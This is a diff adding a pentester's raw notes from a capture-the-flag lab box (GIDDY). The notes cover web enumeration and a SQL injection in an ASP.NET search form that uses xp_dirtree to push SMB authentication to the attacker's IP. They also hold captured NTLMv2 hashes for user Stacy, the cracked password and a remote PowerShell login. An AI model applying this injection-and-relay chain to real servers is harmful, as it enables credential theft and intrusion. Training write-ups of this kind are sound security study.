@@ -1,0 +1,262 @@
+
+
+
+                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ for p in "" PowerShell PowerShellWebAccess pswa 'PowerShell/pswa' 'pswa/pswa'; do
+  echo "=== /$p ==="; curl -Isk "https://$TARGET/$p" | sed -n '1,60p'
+done
+=== / ===
+HTTP/2 200 
+content-length: 700
+content-type: text/html
+last-modified: Sun, 17 Jun 2018 14:24:23 GMT
+accept-ranges: bytes
+etag: "d07343e3466d41:0"
+server: Microsoft-IIS/10.0
+x-powered-by: ASP.NET
+date: Tue, 19 Aug 2025 14:05:52 GMT
+
+=== /PowerShell ===
+HTTP/2 404 
+content-length: 1245
+content-type: text/html
+server: Microsoft-IIS/10.0
+x-powered-by: ASP.NET
+date: Tue, 19 Aug 2025 14:05:52 GMT
+
+=== /PowerShellWebAccess ===
+HTTP/2 404 
+content-length: 1245
+content-type: text/html
+server: Microsoft-IIS/10.0
+x-powered-by: ASP.NET
+date: Tue, 19 Aug 2025 14:05:52 GMT
+
+=== /pswa ===
+HTTP/2 404 
+content-length: 1245
+content-type: text/html
+server: Microsoft-IIS/10.0
+x-powered-by: ASP.NET
+date: Tue, 19 Aug 2025 14:05:52 GMT
+
+=== /PowerShell/pswa ===
+HTTP/2 404 
+content-length: 1245
+content-type: text/html
+server: Microsoft-IIS/10.0
+x-powered-by: ASP.NET
+date: Tue, 19 Aug 2025 14:05:52 GMT
+
+=== /pswa/pswa ===
+HTTP/2 404 
+content-length: 1245
+content-type: text/html
+server: Microsoft-IIS/10.0
+x-powered-by: ASP.NET
+date: Tue, 19 Aug 2025 14:05:52 GMT
+
+                                                                                                                   
+┌──(kali㉿kali)-[~]
+└─$ nmap -p 3389 --script rdp-enum-encryption $TARGET
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-19 10:07 EDT
+Nmap scan report for 10.10.10.104
+Host is up (0.029s latency).
+
+PORT     STATE SERVICE
+3389/tcp open  ms-wbt-server
+| rdp-enum-encryption: 
+|   Security layer
+|     CredSSP (NLA): SUCCESS
+|     CredSSP with Early User Auth: SUCCESS
+|_    RDSTLS: SUCCESS
+
+Nmap done: 1 IP address (1 host up) scanned in 2.15 seconds
+                                                                                                                   
+┌──(kali㉿kali)-[~]
+└─$ curl -v http://10.10.10.104:5985/wsman 2>&1
+*   Trying 10.10.10.104:5985...
+* Connected to 10.10.10.104 (10.10.10.104) port 5985
+* using HTTP/1.x
+> GET /wsman HTTP/1.1
+> Host: 10.10.10.104:5985
+> User-Agent: curl/8.13.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 405 
+< Allow: POST
+< Server: Microsoft-HTTPAPI/2.0
+< Date: Tue, 19 Aug 2025 14:09:05 GMT
+< Connection: close
+< Content-Length: 0
+< 
+* shutting down connection #0
+                                                                                                                   
+┌──(kali㉿kali)-[~]
+└─$ 
+
+──(kali㉿kali)-[~]
+└─$ gobuster dir -u http://10.10.10.104 -w /usr/share/wordlists/dirb/common.txt -t 40
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.104
+[+] Method:                  GET
+[+] Threads:                 40
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/aspnet_client        (Status: 301) [Size: 157] [--> http://10.10.10.104/aspnet_client/]
+/remote               (Status: 302) [Size: 157] [--> /Remote/default.aspx?ReturnUrl=%2fremote]
+Progress: 4614 / 4615 (99.98%)
+===============================================================
+Finished
+===============================================================
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ ffuf -u https://10.10.10.104/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 50 -k -mc 200,204,301,302,401,403 -fs 0
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://10.10.10.104/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 50
+ :: Matcher          : Response status: 200,204,301,302,401,403
+ :: Filter           : Response size: 0
+________________________________________________
+
+aspnet_client           [Status: 301, Size: 158, Words: 9, Lines: 2, Duration: 53ms]
+mvc                     [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 1800ms]
+remote                  [Status: 302, Size: 157, Words: 6, Lines: 4, Duration: 47ms]
+:: Progress: [20469/20469] :: Job [1/1] :: 1179 req/sec :: Duration: [0:00:19] :: Errors: 0 ::
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ 
+
+
+search function at mvc is vuln to SQLi.
+but the payload must NOT be url-encoded.
+
+POST /mvc/Search.aspx HTTP/1.1
+Host: 10.10.10.104
+Content-Length: 744
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Origin: http://10.10.10.104
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.10.10.104/mvc/Search.aspx
+Accept-Encoding: gzip, deflate, br
+Cookie: __AntiXsrfToken=f2ee318f76814f0bae5701e4b6037db8
+Connection: keep-alive
+
+__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=RzJ54GZLuSOOLjVR%2FygNLtSb3shHz%2F7rki0ynNHjGu3JO%2FbfJcF63C0Yu70Qi2T7%2Fq4zFTZ5IEJMELEFug%2BtVm9SO5Bs%2BIakr7UnfFEZMKXk3RiyykauyCCjo%2B9Ilggy57Jol0A4TNVwGGWHAyK345GWX8QRoFNXvFSdqEyN9HFxEoPT5EHziZqoUTO%2B7jbtgmdOVTvEdfGWVXAVAU%2FVo%2Frgh3jeywLbmcSSAph9U1uKGJntxklLgSSTgiqatCkV6j3%2F6Rn7fQ%2BxD0S0RA1Bs5Y8wNxtjiYryAqPlTr1DYvuns9YAxuYe7SsKa98GVIG&__VIEWSTATEGENERATOR=7DDB321F&__EVENTVALIDATION=kXZOKwYHdAJePlyZQPIz%2FJAw0d8c2ZqbgeNqpPIiP1tiAN0UoqUCkLfacc%2BgbUraFUrpTQ5g6Q62XP6r%2FI%2F0oxI8konw0a6AfBxpMYvokVU%2FH4KuxhDhh%2Bpa3QGgKF5BCbBis0ll4KBCXaawv89%2Bdg%3D%3D&ctl00%24MainContent%24SearchTerm='+EXEC+master.sys.xp_dirtree+'\\10.10.14.16\share--&ctl00%24MainContent%24Button1=Search
+
+
+
+
+
+
+[+] Listening for events...                                                                                                                                                                                                                 
+
+[SMB] NTLMv2-SSP Client   : 10.10.10.104
+[SMB] NTLMv2-SSP Username : GIDDY\Stacy
+[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:71e0cadf0bc7ef2a:A1E74DDF10E76127B131E46863B8DF0E:010100000000000000970B795411DC01F5B6898A416B61FD0000000002000800570039003600370001001E00570049004E002D004B00510036004F005A0054003400320038004                                                                                                                        B00460004003400570049004E002D004B00510036004F005A0054003400320038004B0046002E0057003900360037002E004C004F00430041004C000300140057003900360037002E004C004F00430041004C000500140057003900360037002E004C004F00430041004C000700080000970B795411DC0106000400020000000800300030000000000000000000000000300000256766E1E6ED50CD5A275F4C719227451A0B5BCE33A5DA6354E3E66F0B393EF50A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003600000000000000000000000000                                                                                     
+[SMB] NTLMv2-SSP Client   : 10.10.10.104
+[SMB] NTLMv2-SSP Username : GIDDY\Stacy
+[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:1161af695b2be959:4167A45FA68CC19C56D9FB7D85038DDB:010100000000000000970B795411DC011D9651D31BECB0C00000000002000800570039003600370001001E00570049004E002D004B00510036004F005A0054003400320038004B00460004003400570049004E002D004B00510036004F005A0054003400320038004B0046002E0057003900360037002E004C004F00430041004C000300140057003900360037002E004C004F00430041004C000500140057003900360037002E004C004F00430041004C000700080000970B795411DC0106000400020000000800300030000000000000000000000000300000256766E1E6ED50CD5A275F4C719227451A0B5BCE33A5DA6354E3E66F0B393EF50A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003600000000000000000000000000                                                                                     
+[SMB] NTLMv2-SSP Client   : 10.10.10.104
+[SMB] NTLMv2-SSP Username : GIDDY\Stacy
+[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:bf18a73c532e2d3c:ED620BD04E367B4027D95C05A6A73FEE:010100000000000000970B795411DC011F41342E164DC3BD0000000002000800570039003600370001001E00570049004E002D004B00510036004F005A0054003400320038004B00460004003400570049004E002D004B00510036004F005A0054003400320038004B0046002E0057003900360037002E004C004F00430041004C000300140057003900360037002E004C004F00430041004C000500140057003900360037002E004C004F00430041004C000700080000970B795411DC0106000400020000000800300030000000000000000000000000300000256766E1E6ED50CD5A275F4C719227451A0B5BCE33A5DA6354E3E66F0B393EF50A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003600000000000000000000000000                                                                                     
+
+
+
+
+john stacy.hash --wordlist=/usr/share/wordlists/rockyou.txt
+stacy:xNnWo6272k7x
+
+
+this is used to sign into
+https://10.10.10.104/remote/en-US/console.aspx
+we must prepend .\ so Windows interprets this as a local, rather than a domain login.
+
+
+
+Windows PowerShell
+
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
+
+ 
+
+PS C:\Users\Stacy\Documents> 
+
+dir
+
+ 
+
+ 
+
+    Directory: C:\Users\Stacy\Documents
+
+ 
+
+ 
+
+Mode                LastWriteTime         Length Name                                                                  
+
+----                -------------         ------ ----                                                                  
+
+-a----        6/17/2018   9:36 AM              6 unifivideo                                                            
+
+PS C:\Users\Stacy\Documents> 
+
+cmd /c REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
+
+ 
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\AddressBook
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Connection Manager
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\DirectDrawEx
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\DXM_Runtime
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Fontcore
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\IE40
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\IE4Data
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\IE5BAKEX
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\IEData
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\KB3182545
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Microsoft SQL Server 13
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Microsoft SQL Server SQLServer2016
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\MobileOptionPack
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\MPlayer2
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\SchedulingAgent
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Ubiquiti UniFi Video
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WIC
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{0AE831BC-F2A8-4DE2-8FBF-68B220611A7F}
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{0C457EC3-E998-4041-B856-908D5A2C1708}
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{0D9BD39A-A870-4FDF-B590-1E9787CF16D9}
+
+
+
+stopping here due to compilation required. no g++-mingw-w64 on my kali
+
+
